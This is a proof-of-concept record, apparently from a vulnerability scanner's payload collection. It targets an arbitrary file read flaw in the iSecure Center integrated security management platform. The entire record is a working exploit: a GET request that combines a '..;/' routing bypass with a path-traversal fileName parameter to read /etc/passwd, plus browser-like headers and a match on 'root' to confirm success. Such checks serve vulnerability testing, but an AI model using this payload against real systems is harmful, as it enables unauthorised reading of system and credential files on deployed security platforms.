{
        'name': '综合安防管理平台 iSecure Center /v1/orgs/download 任意文件读取漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd',
            'headers': {
                'Upgrade-Insecure-Requests': '1',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Accept-Encoding': 'gzip, deflate',
                'Cache-Control': 'max-age=0'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'root'
        }}]
    }